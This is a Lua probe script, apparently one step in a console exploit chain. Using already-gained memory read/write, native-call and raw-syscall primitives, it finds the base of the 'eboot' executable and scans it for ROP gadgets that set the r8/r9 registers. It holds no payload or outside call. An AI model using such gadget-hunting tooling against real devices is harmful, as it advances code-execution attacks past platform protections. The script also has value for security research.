-- CRASH_CLASS: LOW
-- PROBE 531h: Fast gadget search for r8/r9 control
--
-- 386a confirmed: NO pop r8/pop r9 in 4.6MB eboot
-- Need alternative: mov r8, rax; ret or similar
--
-- Scan strategy: read dwords, match 4-byte patterns only
-- Much faster than byte-level scan

print("=== PROBE 531h: GADGET FAST ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print(string.format("pid=%d", pid))

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local eb_lo = rd(N(ib) + 0x108) or 0
local eb_hi = rd(N(ib) + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
local eb_size = rd(N(ib) + 0x110) or 0
if eb_size < 0 then eb_size = eb_size + 0x100000000 end
print(string.format("eb=0x%X%08X+0x%X", eb_hi, eb_lo, eb_size))

local ebn = eb_hi * 0x100000000 + eb_lo
local scan = math.min(eb_size, 0x494000)

-- Search for 4-byte aligned patterns (fast: 1 read per 4 bytes)
-- Patterns we want (little-endian dword values):
-- 49 89 C0 C3 = mov r8, rax; ret      → 0xC3C08949
-- 49 89 C1 C3 = mov r9, rcx; ret      → 0xC3C18949
-- 49 89 D0 C3 = mov r8, rdx; ret      → 0xC3D08949
-- 49 89 D1 C3 = mov r9, rdx; ret      → 0xC3D18949
-- 49 89 F0 C3 = mov r8, rsi; ret      → 0xC3F08949
-- 49 89 F8 C3 = mov r8, rdi; ret      → 0xC3F88949
-- 4C 89 C7 C3 = mov rdi, r8; ret      → 0xC3C7894C
-- 49 87 C0 C3 = xchg r8, rax; ret     → 0xC3C08749
-- 49 87 C1 C3 = xchg r9, rcx; ret     → 0xC3C18749

-- Also search for 3-byte patterns where next byte is C3:
-- We can detect this by checking current dword has pattern in top 3 bytes
-- and next dword starts with C3

print("")
print("[A] 4-byte aligned patterns")

local targets = {
    {0xC3C08949, "mov r8,rax;ret"},
    {0xC3C18949, "mov r9,rcx;ret"},
    {0xC3D08949, "mov r8,rdx;ret"},
    {0xC3D18949, "mov r9,rdx;ret"},
    {0xC3F08949, "mov r8,rsi;ret"},
    {0xC3F88949, "mov r8,rdi;ret"},
    {0xC3C7894C, "mov rdi,r8;ret"},
    {0xC3C08749, "xchg r8,rax;ret"},
    {0xC3C18749, "xchg r9,rcx;ret"},
}

local found = {}
for off = 0, scan - 4, 4 do
    local d = rd(ebn + off)
    if d then
        if d < 0 then d = d + 0x100000000 end
        for _, t in ipairs(targets) do
            if d == t[1] then
                if not found[t[2]] then found[t[2]] = {} end
                table.insert(found[t[2]], off)
                if #found[t[2]] <= 2 then
                    print(string.format("  +0x%06X: %s", off, t[2]))
                end
            end
        end
    end
end

for name, offsets in pairs(found) do
    if #offsets > 2 then
        print(string.format("  %s: %d total (first at +0x%X)", name, #offsets, offsets[1]))
    end
end

-- ============================================================
-- [B] Search for unaligned patterns (shifted by 1,2,3 bytes)
-- Check pairs of dwords for patterns that cross boundaries
-- ============================================================
print("")
print("[B] Unaligned pattern search (first 2MB)")

local scan2 = math.min(scan, 0x200000)
local ua_found = {}

for off = 0, scan2 - 8, 4 do
    local d0 = rd(ebn + off)
    local d1 = rd(ebn + off + 4)
    if d0 and d1 then
        if d0 < 0 then d0 = d0 + 0x100000000 end
        if d1 < 0 then d1 = d1 + 0x100000000 end

        -- Extract bytes from both dwords
        -- d0: b0 b1 b2 b3, d1: b4 b5 b6 b7
        local b = {}
        b[0] = d0 % 256
        b[1] = math.floor(d0 / 256) % 256
        b[2] = math.floor(d0 / 65536) % 256
        b[3] = math.floor(d0 / 16777216) % 256
        b[4] = d1 % 256
        b[5] = math.floor(d1 / 256) % 256
        b[6] = math.floor(d1 / 65536) % 256
        b[7] = math.floor(d1 / 16777216) % 256

        -- Check at offsets 1,2,3 within this 8-byte window
        for shift = 1, 3 do
            local s = shift
            -- 49 89 C0 C3 = mov r8, rax; ret
            if b[s] == 0x49 and b[s+1] == 0x89 and b[s+2] == 0xC0 and b[s+3] == 0xC3 then
                local key = "mov r8,rax;ret@" .. (off + shift)
                if not ua_found[key] then
                    ua_found[key] = true
                    print(string.format("  +0x%06X: mov r8,rax;ret", off + shift))
                end
            end
            -- 49 89 C1 C3 = mov r9, rcx; ret
            if b[s] == 0x49 and b[s+1] == 0x89 and b[s+2] == 0xC1 and b[s+3] == 0xC3 then
                local key = "mov r9,rcx;ret@" .. (off + shift)
                if not ua_found[key] then
                    ua_found[key] = true
                    print(string.format("  +0x%06X: mov r9,rcx;ret", off + shift))
                end
            end
            -- 49 89 D0 C3 = mov r8, rdx; ret
            if b[s] == 0x49 and b[s+1] == 0x89 and b[s+2] == 0xD0 and b[s+3] == 0xC3 then
                local key = "mov r8,rdx;ret@" .. (off + shift)
                if not ua_found[key] then
                    ua_found[key] = true
                    print(string.format("  +0x%06X: mov r8,rdx;ret", off + shift))
                end
            end
            -- 49 89 F0 C3 = mov r8, rsi; ret
            if b[s] == 0x49 and b[s+1] == 0x89 and b[s+2] == 0xF0 and b[s+3] == 0xC3 then
                local key = "mov r8,rsi;ret@" .. (off + shift)
                if not ua_found[key] then
                    ua_found[key] = true
                    print(string.format("  +0x%06X: mov r8,rsi;ret", off + shift))
                end
            end
            -- 4C 89 C7 C3 = mov rdi, r8; ret
            if b[s] == 0x4C and b[s+1] == 0x89 and b[s+2] == 0xC7 and b[s+3] == 0xC3 then
                local key = "mov rdi,r8;ret@" .. (off + shift)
                if not ua_found[key] then
                    ua_found[key] = true
                    print(string.format("  +0x%06X: mov rdi,r8;ret", off + shift))
                end
            end
            -- 49 87 C0 C3 = xchg rax, r8; ret
            if b[s] == 0x49 and b[s+1] == 0x87 and b[s+2] == 0xC0 and b[s+3] == 0xC3 then
                local key = "xchg rax,r8;ret@" .. (off + shift)
                if not ua_found[key] then
                    ua_found[key] = true
                    print(string.format("  +0x%06X: xchg rax,r8;ret", off + shift))
                end
            end
        end
    end
end

local ua_count = 0
for _ in pairs(ua_found) do ua_count = ua_count + 1 end
print(string.format("  unaligned hits: %d", ua_count))

-- ============================================================
-- [C] Alternative: search for call-with-stack-args patterns
-- A function that moves stack values to r8/r9 before calling
-- E.g.: mov r8, [rsp+XX]; mov r9, [rsp+YY]; call [something]; ret
-- Pattern: 4C 8B 44 24 XX = mov r8, [rsp+XX]
--          4C 8B 4C 24 XX = mov r9, [rsp+XX]
-- ============================================================
print("")
print("[C] mov r8,[rsp+X] patterns (first 2MB)")

local stack_r8 = {}
local stack_r9 = {}

for off = 0, scan2 - 8, 4 do
    local d = rd(ebn + off)
    if d then
        if d < 0 then d = d + 0x100000000 end
        local b0 = d % 256
        local b1 = math.floor(d / 256) % 256
        local b2 = math.floor(d / 65536) % 256
        local b3 = math.floor(d / 16777216) % 256

        -- 4C 8B 44 24 = mov r8, [rsp+imm8]
        if b0 == 0x4C and b1 == 0x8B and b2 == 0x44 and b3 == 0x24 then
            local next_d = rd(ebn + off + 4)
            if next_d then
                if next_d < 0 then next_d = next_d + 0x100000000 end
                local imm = next_d % 256
                table.insert(stack_r8, {off = off, imm = imm})
                if #stack_r8 <= 5 then
                    print(string.format("  +0x%06X: mov r8,[rsp+0x%02X]", off, imm))
                end
            end
        end
        -- 4C 8B 4C 24 = mov r9, [rsp+imm8]
        if b0 == 0x4C and b1 == 0x8B and b2 == 0x4C and b3 == 0x24 then
            local next_d = rd(ebn + off + 4)
            if next_d then
                if next_d < 0 then next_d = next_d + 0x100000000 end
                local imm = next_d % 256
                table.insert(stack_r9, {off = off, imm = imm})
                if #stack_r9 <= 5 then
                    print(string.format("  +0x%06X: mov r9,[rsp+0x%02X]", off, imm))
                end
            end
        end
    end
end

print(string.format("  mov r8,[rsp+X]: %d hits", #stack_r8))
print(string.format("  mov r9,[rsp+X]: %d hits", #stack_r9))

print("")
print("=== 531h DONE ===")
